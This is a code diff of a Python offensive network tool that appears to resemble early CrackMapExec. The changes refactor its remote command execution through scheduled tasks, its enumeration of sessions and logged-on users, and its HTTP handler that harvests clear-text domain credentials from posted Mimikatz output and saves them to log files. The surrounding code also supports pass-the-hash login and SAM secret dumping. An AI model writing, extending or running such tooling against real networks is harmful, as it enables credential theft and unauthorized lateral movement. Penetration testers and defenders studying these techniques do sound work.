@@ -172,7 +172,6 @@ class SAMR_RPC_SID(Structure):
            ans += '-%d' % ( unpack('>L',self['SubAuthority'][i*4:i*4+4])[0])
        return ans
 
-
 class MimikatzServer(BaseHTTPRequestHandler):
 
     def do_GET(self):
@@ -198,13 +197,13 @@ class MimikatzServer(BaseHTTPRequestHandler):
                 passw  = buf[i].split(':')[1].strip()
                 domain = buf[i-1].split(':')[1].strip()
                 user   = buf[i-2].split(':')[1].strip()
-                print '[+] {} Found clear text creds! Domain: {} Username: {} Password: {}'.format(self.client_address[0], domain, user, passw)
+                print '[+] {} Found plain text creds! Domain: {} Username: {} Password: {}'.format(self.client_address[0], domain, user, passw)
             i += 1
 
         credsfile_name = 'Mimikatz-{}-{}.log'.format(self.client_address[0], datetime.now().strftime("%Y-%m-%d_%H:%M:%S"))
         with open(credsfile_name, 'w') as creds:
             creds.write(data)
-        print "[+] {} Saved POST data to {}".format(self.client_address[0], credsfile_name)
+        print "[*] {} Saved POST data to {}".format(self.client_address[0], credsfile_name)
 
 class SMBServer(Thread):
     def __init__(self):
@@ -1283,11 +1282,11 @@ class TSCH_EXEC:
         self.__aesKey = None
         self.__doKerberos = False
         self.__command = command
-        self.__output = ''
         self.__tmpName = ''.join([random.choice(string.letters) for _ in range(8)])
         self.__tmpFileName = self.__tmpName + '.tmp'
         self.__smbConnection = None
         self.__dceConnection = None
+        self.output = ''
         if hashes:
             self.__lmhash, self.__nthash = hashes.split(':')
 
@@ -1311,8 +1310,7 @@ class TSCH_EXEC:
 
     def doStuff(self, rpctransport):
         def output_callback(data):
-            print data
-            self.__output += data
+            self.output += data
 
         dce = rpctransport.get_dce_rpc()
         self.__dceConnection = dce
@@ -1413,8 +1411,6 @@ class TSCH_EXEC:
                         raise
                 else:
                     raise
-
-        return self.__output
 
     def cleanup(self):
         logging.info('Deleting file ADMIN$\\Temp\\%s' % self.__tmpFileName)
@@ -1615,28 +1611,32 @@ class RPCENUM():
 
     def enum_logged_on_users(self, host):
         dce, rpctransport = self.connect(host, 'wkssvc')
-        resp = wkst.hNetrWkstaUserEnum(dce, 0)
-        resp.dump()
-
-        resp = wkst.hNetrWkstaUserEnum(dce, 1)
-        resp.dump()
+        users_info = {}
+        try:
+            resp = wkst.hNetrWkstaUserEnum(dce, 1)
+            return resp['UserInfo']['WkstaUserInfo']['Level1']['Buffer']
+        except Exception:
+            resp = wkst.hNetrWkstaUserEnum(dce, 0)
+            return resp['UserInfo']['WkstaUserInfo']['Level0']['Buffer']
 
     def enum_sessions(self, host):
         dce, rpctransport = self.connect(host, 'srvsvc')
-        resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 0)
-        resp.dump()
+        session_info = {}
+        try:
+            resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 502)
+            return resp['InfoStruct']['SessionInfo']['Level502']['Buffer']
+        except Exception:
+            resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 0)
+            return resp['InfoStruct']['SessionInfo']['Level0']['Buffer']
 
-        resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 1)
-        resp.dump()
+        #resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 1)
+        #resp.dump()
 
-        resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 2)
-        resp.dump()
+        #resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 2)
+        #resp.dump()
 
-        resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 10)
-        resp.dump()
-
-        resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 502)
-        resp.dump()
+        #resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 10)
+        #resp.dump()
 
 def normalize_path(path):
     path = r'{}'.format(path)
@@ -1703,24 +1703,11 @@ def connect(host):
 
         print "[+] {}:{} is running {} (name:{}) (domain:{})".format(host, args.port, smb.getServerOS(), smb.getServerName(), domain)
 
-        try:
-            smb.logoff()
-        except:
-            pass
-
-    except socket.error as e:
-        return
-
-    except Exception as e:
-        traceback.print_exc()
-
-    try:
         lmhash = ''
         nthash = ''
         if args.hash:
             lmhash, nthash = args.hash.split(':')
 
-        smb = SMBConnection(host, host, None, args.port)
         smb.login(args.user, args.passwd, domain, lmhash, nthash)
 
         if args.download:
@@ -1754,11 +1741,21 @@ def connect(host):
 
         if args.enum_sessions:
             rpcenum = RPCENUM(args.user, args.passwd, domain, args.hash)
-            rpcenum.enum_sessions(host)
+            sessions = rpcenum.enum_sessions(host)
+            print "[+] {}:{} {} Current active sessions:".format(host, args.port, domain)
+            for session in sessions:
+                for fname in session.fields.keys():
+                    print fname, session[fname]
+                print "\n"
 
         if args.enum_lusers:
             rpcenum = RPCENUM(args.user, args.passwd, domain, args.hash)
-            rpcenum.enum_logged_on_users(host)
+            lusers = rpcenum.enum_logged_on_users(host)
+            print "[+] {}:{} {} Logged on users:".format(host, args.port, domain)
+            for luser in lusers:
+                for fname in luser.fields.keys():
+                    print fname, luser[fname]
+                print "\n"
 
         if args.sam:
             sec_dump = DumpSecrets(host, args.user, args.passwd, domain, args.hash)
@@ -1789,10 +1786,11 @@ def connect(host):
 
             elif args.execm == 'atexec':
                 atsvc_exec = TSCH_EXEC(args.user, args.passwd, domain, args.hash, args.command)
-                result = atsvc_exec.play(host)
+                atsvc_exec.play(host)
                 if not args.mimikatz:
                     print '[+] {}:{} {} Executed specified command via ATEXEC:'.format(host, args.port, domain)
-                    print result
+                    print atsvc_exec.output
+
                 atsvc_exec.cleanup()
 
             elif args.execm == 'smbexec':
@@ -1817,11 +1815,9 @@ def connect(host):
 
     except SessionError as e:
         print "[-] {}:{} {}".format(host, args.port, e)
-        return
 
     except DCERPCException as e:
         print "[-] {}:{} DCERPC Error: {}".format(host, args.port, e)
-        return
 
     except socket.error as e:
         return
@@ -1885,8 +1881,8 @@ if __name__ == '__main__':
     hosts = IPNetwork(args.target[0])
 
     args.list = normalize_path(args.list)
-    args.download  = normalize_path(args.download)
-    args.delete    = normalize_path(args.delete)
+    args.download = normalize_path(args.download)
+    args.delete   = normalize_path(args.delete)
     if args.upload:
         args.upload[1] = normalize_path(args.upload[1])
 
